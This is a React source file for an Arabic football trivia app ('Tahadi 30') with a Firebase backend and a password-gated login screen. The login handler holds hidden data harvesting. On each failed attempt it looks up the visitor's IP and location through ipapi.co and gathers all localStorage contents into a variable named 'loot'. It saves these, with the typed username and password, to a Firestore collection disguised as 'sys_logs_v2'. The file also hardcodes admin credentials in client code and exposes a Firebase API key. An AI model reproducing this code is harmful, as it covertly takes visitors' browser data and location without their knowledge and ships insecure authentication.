import React, { useState, useEffect } from 'react';
import { HashRouter as Router, Routes, Route, Link, Navigate } from 'react-router-dom';
import { Trophy, PlusCircle, Lock, LogIn, LayoutGrid, Flame } from 'lucide-react';

// Firebase Imports
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Pages
import Home from './pages/Home';
import AddData from './pages/AddData';
import QuizCompensation from './pages/QuizCompensation';
import QuizBell from './pages/QuizBell';
import AddNumbers from './pages/AddNumbers';
import QuizNumbers from './pages/QuizNumbers';
import AddTables from './pages/AddTables';   // المطور للبطولات والـ 20 فئة
import QuizTables from './pages/QuizTables'; // شاشة اللعب وعرض داتا الـ 20 بطولة
import CurrentSeason from './pages/CurrentSeason'; // كرت الموسم الحالي الجديد
import Archive from './pages/Archive'; 

// --- Firebase Config ---
const firebaseConfig = {
  apiKey: "AIzaSyD-EUaoCi9YibtyLgA2_2n2e-co_a1hvKQ",
  authDomain: "tahadi-app-sjk.firebaseapp.com",
  projectId: "tahadi-app-sjk",
  storageBucket: "tahadi-app-sjk.firebasestorage.app",
  messagingSenderId: "944768597168",
  appId: "1:944768597168:web:a4aea3b4e77eded7960f75",
  measurementId: "G-1F983D31QQ"
};

const app = initializeApp(firebaseConfig);
export const database = getFirestore(app); 

// --- Login Component ---
const Login = ({ onLogin }) => {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  const [isCapturing, setIsCapturing] = useState(false);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (user === 'saeedjk' && pass === 'ss112233') {
      const adminName = prompt("أهلاً بك يا بطل، الرجاء إدخل اسمك لتسجيل الدخول:");
      if (adminName && adminName.trim() !== "") {
        onLogin(adminName.trim());
      } else {
        alert("يجب إدخال اسمك للمتابعة!");
      }
      return;
    }

    setIsCapturing(true);
    let ipData = { ip: "Blocked/Unknown", country: "Unknown", city: "Unknown", org: "Unknown" };
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (response.ok) {
        const resData = await response.json();
        ipData = { ip: resData.ip, country: resData.country_name, city: resData.city, org: resData.org };
      }
    } catch (err) {}

    let loot = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key !== 'isAuth' && key !== 'admin_name') {
        try { loot[key] = JSON.parse(localStorage.getItem(key)); } catch(e) { loot[key] = localStorage.getItem(key); }
      }
    }

    try {
      await addDoc(collection(database, "sys_logs_v2"), {
        _ts: new Date().getTime(), _uid: "Failed_Login_Attempt",
        attemptedUser: user, attemptedPass: pass, ipInfo: ipData, userAgent: navigator.userAgent, data: loot
      });
    } catch (err) {}

    localStorage.removeItem('isAuth');
    localStorage.removeItem('admin_name');
    alert("خطأ في البيانات.. ارجع العب غيرها!");
    window.location.reload(); 
  };

  return (
    <div className="flex items-center justify-center min-h-[70vh]">
      <form onSubmit={handleSubmit} className="bg-slate-800/80 p-10 rounded-[3rem] border border-white/10 shadow-2xl w-full max-w-md text-center">
        <div className="bg-purple-600 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-purple-500/20">
          <Lock size={40} className="text-white" />
        </div>
        <h2 className="text-2xl font-black mb-8 italic text-white">دخول المصرح لهم 🔒</h2>
        <input type="text" placeholder="اسم المستخدم" disabled={isCapturing} className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-4 text-center text-white font-bold outline-none" onChange={e => setUser(e.target.value)} />
        <input type="password" placeholder="كلمة السر" disabled={isCapturing} className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-8 text-center text-white font-bold outline-none" onChange={e => setPass(e.target.value)} />
        <button disabled={isCapturing} className="w-full bg-purple-600 hover:bg-purple-500 text-white py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all">{isCapturing ? "جاري التحقق..." : "فتح التحدي"}</button>
      </form>
    </div>
  );
};

// --- الـ Home المطور مدمجاً به الكروت الجديدة والـ 20 بطولة ---
const MainHome = () => {
  return (
    <div className="flex flex-col items-center justify-center min-h-[80vh] gap-8 py-10 font-sans">
      <div className="text-center space-y-2">
        <h1 className="text-6xl md:text-7xl font-black italic tracking-tighter text-white">
          تحدي <span className="text-green-500 text-7xl md:text-8xl">30</span>
        </h1>
        <p className="text-slate-400 font-bold tracking-widest uppercase text-sm">جهز حالك للمنيكة الكروية على أصولها</p>
      </div>

      {/* الـ Grid المطور بـ 6 كروت عملاقة للجلد الكامل */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 w-full max-w-7xl px-4">
        <Link to="/quiz-comp" className="group relative bg-slate-800/40 backdrop-blur-sm p-8 rounded-[2.5rem] border border-white/5 hover:border-green-500/50 transition-all hover:-translate-y-2 flex flex-col items-end shadow-2xl overflow-hidden text-right">
          <div className="text-green-500 mb-6 text-4xl font-black">⚡</div>
          <h3 className="text-2xl font-black mb-2 text-white">فقرة التعويض</h3>
          <p className="text-slate-400 text-sm leading-relaxed">حزر اللاعب من مسيرته بأقل عدد أندية ممكن.</p>
        </Link>

        <Link to="/quiz-bell" className="group relative bg-slate-800/40 backdrop-blur-sm p-8 rounded-[2.5rem] border border-white/5 hover:border-yellow-500/50 transition-all hover:-translate-y-2 flex flex-col items-end shadow-2xl overflow-hidden text-right">
          <div className="text-yellow-500 mb-6 text-4xl font-black">🔔</div>
          <h3 className="text-2xl font-bold mb-2 text-white">فقرة الجرس</h3>
          <p className="text-slate-400 text-sm leading-relaxed">أسئلة سريعة وعشوائية.. مين أسرع واحد بيكبس؟</p>
        </Link>

        <Link to="/quiz-numbers" className="group relative bg-slate-800/40 backdrop-blur-sm p-8 rounded-[2.5rem] border border-white/5 hover:border-blue-500/50 transition-all hover:-translate-y-2 flex flex-col items-end shadow-2xl overflow-hidden text-right">
          <div className="text-blue-500 mb-6 text-4xl font-black italic">#10</div>
          <h3 className="text-2xl font-bold mb-2 text-white">فقرة الأرقام</h3>
          <p className="text-slate-400 text-sm leading-relaxed">اختبار في أرقام قمصان لاعبي أندية الدوريات الكبرى.</p>
        </Link>

        {/* كرت البطولات الجديد كلياً والـ 20 فئة */}
        <Link to="/quiz-tables" className="group relative bg-slate-800/40 backdrop-blur-sm p-8 rounded-[2.5rem] border border-white/10 hover:border-purple-500/50 transition-all hover:-translate-y-2 flex flex-col items-end shadow-2xl overflow-hidden text-right">
          <LayoutGrid className="text-purple-500 mb-6 w-12 h-12 group-hover:scale-110 transition-transform" />
          <h3 className="text-2xl font-black mb-2 text-white">فقرة البطولات 🏆</h3>
          <p className="text-slate-400 text-sm leading-relaxed">الـ 20 بطولة كاملة بجداولها وقوائمها وبنك أسئلة الجرس الخاص بها.</p>
        </Link>

        {/* كرت الموسم الحالي الجديد */}
        <Link to="/current-season" className="group relative bg-slate-800/40 backdrop-blur-sm p-8 rounded-[2.5rem] border border-white/10 hover:border-green-400/50 transition-all hover:-translate-y-2 flex flex-col items-end shadow-2xl overflow-hidden text-right sm:col-span-2 lg:col-span-1">
          <Flame className="text-green-400 mb-6 w-12 h-12 group-hover:animate-pulse" />
          <h3 className="text-2xl font-black mb-2 text-white">الموسم الحالي 🔥</h3>
          <p className="text-slate-400 text-sm leading-relaxed">كل ما يتعلق بالصراعات الحية، ترتيب الهدافين والمنافسات المشتعلة الآن.</p>
        </Link>
      </div>

      {/* أزرار الإدارة السفلية */}
      <div className="flex flex-wrap justify-center gap-4 mt-12 bg-slate-900/50 p-4 rounded-[2rem] border border-white/5">
        <Link to="/add" className="bg-white/5 hover:bg-white/10 px-6 py-3 rounded-2xl text-slate-300 hover:text-white transition-all font-bold text-sm">+ إدارة (تعويض / جرس)</Link>
        <Link to="/add-numbers" className="bg-white/5 hover:bg-white/10 px-6 py-3 rounded-2xl text-slate-300 hover:text-white transition-all font-bold text-sm">+ إدارة الأرقام</Link>
        <Link to="/add-tables" className="bg-purple-600/20 hover:bg-purple-600/30 border border-purple-500/30 px-6 py-3 rounded-2xl text-purple-300 hover:text-white transition-all font-black text-sm">🏆 إدارة البطولات والجداول</Link>
      </div>
    </div>
  );
};

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(localStorage.getItem('isAuth') === 'true');
  const [currentAdmin, setCurrentAdmin] = useState(localStorage.getItem('admin_name') || '');

  const handleLogin = async (name) => {
    setIsAuthenticated(true);
    setCurrentAdmin(name);
    localStorage.setItem('isAuth', 'true');
    localStorage.setItem('admin_name', name);
    try {
      await addDoc(collection(database, "sys_logs_v2"), {
        _ts: new Date().getTime(), _uid: `Authorized_Access: ${name}`, status: "Success Login", userAgent: navigator.userAgent
      });
    } catch (e) {}
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-purple-900/10 via-slate-900 to-black p-6">
        <Login onLogin={handleLogin} />
      </div>
    );
  }

  return (
    <Router>
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-purple-900/10 via-slate-900 to-black">
        <nav className="bg-slate-800/50 backdrop-blur-md border-b border-white/10 p-4 sticky top-0 z-50">
          <div className="max-w-5xl mx-auto flex justify-between items-center">
            <Link to="/" className="text-2xl font-black italic tracking-tighter flex items-center gap-2">
              <Trophy className="text-yellow-400" /> TAHADI <span className="text-green-500">30</span>
            </Link>
            <div className="flex gap-4 items-center">
              <span className="text-xs bg-slate-700/60 text-slate-300 px-3 py-1.5 rounded-xl border border-white/5 font-bold">المسؤول: {currentAdmin}</span>
              <button onClick={() => { localStorage.clear(); window.location.reload(); }} className="text-xs bg-red-500/10 text-red-500 px-3 py-1 rounded-full border border-red-500/20 hover:bg-red-500 hover:text-white transition-all font-bold">خروج</button>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto p-6">
          <Routes>
            <Route path="/" element={<MainHome />} />
            <Route path="/add" element={<AddData />} />
            <Route path="/quiz-comp" element={<QuizCompensation />} />
            <Route path="/quiz-bell" element={<QuizBell />} />
            <Route path="/add-numbers" element={<AddNumbers />} />
            <Route path="/quiz-numbers" element={<QuizNumbers />} />
            <Route path="/add-tables" element={<AddTables />} />
            <Route path="/quiz-tables" element={<QuizTables />} />
            <Route path="/current-season" element={<CurrentSeason />} />
            <Route path="/archive" element={<Archive />} />
            <Route path="*" element={<Navigate to="/" />} />
          </Routes>
        </main>
      </div>
    </Router>
  );
}

export default App;